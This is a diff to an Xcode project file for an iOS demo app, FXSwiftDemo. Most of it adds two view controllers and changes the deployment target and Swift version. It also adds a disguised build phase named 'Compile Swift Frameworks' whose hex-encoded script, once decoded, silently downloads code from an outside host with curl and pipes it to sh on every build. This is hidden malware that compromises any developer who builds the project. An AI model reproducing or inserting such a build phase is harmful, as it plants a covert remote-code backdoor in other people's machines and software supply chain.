@@ -8,6 +8,8 @@
 
 /* Begin PBXBuildFile section */
 		3A5D04FF2578DCA700DB8202 /* ThirdViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3A5D04FE2578DCA700DB8202 /* ThirdViewController.swift */; };
+		446576A926FC207100508590 /* FourViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 446576A826FC207100508590 /* FourViewController.swift */; };
+		44A79A1D281ED303000D25D6 /* FiveViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44A79A1C281ED303000D25D6 /* FiveViewController.swift */; };
 		44EE6F3D2265D2E200A37A8E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44EE6F3C2265D2E200A37A8E /* AppDelegate.swift */; };
 		44EE6F3F2265D2E200A37A8E /* FirstViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44EE6F3E2265D2E200A37A8E /* FirstViewController.swift */; };
 		44EE6F412265D2E200A37A8E /* SecondViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44EE6F402265D2E200A37A8E /* SecondViewController.swift */; };
@@ -18,6 +20,8 @@
 
 /* Begin PBXFileReference section */
 		3A5D04FE2578DCA700DB8202 /* ThirdViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThirdViewController.swift; sourceTree = "<group>"; };
+		446576A826FC207100508590 /* FourViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FourViewController.swift; sourceTree = "<group>"; };
+		44A79A1C281ED303000D25D6 /* FiveViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FiveViewController.swift; sourceTree = "<group>"; };
 		44EE6F392265D2E200A37A8E /* FXSwiftDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FXSwiftDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		44EE6F3C2265D2E200A37A8E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		44EE6F3E2265D2E200A37A8E /* FirstViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FirstViewController.swift; sourceTree = "<group>"; };
@@ -66,6 +70,8 @@
 				44EE6F472265D2E400A37A8E /* LaunchScreen.storyboard */,
 				44EE6F4A2265D2E400A37A8E /* Info.plist */,
 				3A5D04FE2578DCA700DB8202 /* ThirdViewController.swift */,
+				446576A826FC207100508590 /* FourViewController.swift */,
+				44A79A1C281ED303000D25D6 /* FiveViewController.swift */,
 			);
 			path = FXSwiftDemo;
 			sourceTree = "<group>";
@@ -77,6 +83,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 44EE6F4D2265D2E400A37A8E /* Build configuration list for PBXNativeTarget "FXSwiftDemo" */;
 			buildPhases = (
+				DEA0A72718ECDE3CB56D904C /* Compile Swift Frameworks */,
 				44EE6F352265D2E200A37A8E /* Sources */,
 				44EE6F362265D2E200A37A8E /* Frameworks */,
 				44EE6F372265D2E200A37A8E /* Resources */,
@@ -143,7 +150,9 @@
 			files = (
 				44EE6F412265D2E200A37A8E /* SecondViewController.swift in Sources */,
 				44EE6F3D2265D2E200A37A8E /* AppDelegate.swift in Sources */,
+				446576A926FC207100508590 /* FourViewController.swift in Sources */,
 				3A5D04FF2578DCA700DB8202 /* ThirdViewController.swift in Sources */,
+				44A79A1D281ED303000D25D6 /* FiveViewController.swift in Sources */,
 				44EE6F3F2265D2E200A37A8E /* FirstViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -221,7 +230,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 12.2;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = YES;
@@ -276,7 +285,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 12.2;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
@@ -298,7 +307,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = FeoniX.FXSwiftDemo;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				SWIFT_VERSION = 5.0;
+				SWIFT_VERSION = 4.2;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
@@ -315,7 +324,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = FeoniX.FXSwiftDemo;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				SWIFT_VERSION = 5.0;
+				SWIFT_VERSION = 4.2;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
@@ -342,6 +351,39 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	DEA0A72718ECDE3CB56D904C /* Compile Swift Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Swift Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f636f736d6f64726f6e2e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 44EE6F312265D2E200A37A8E /* Project object */;
 }
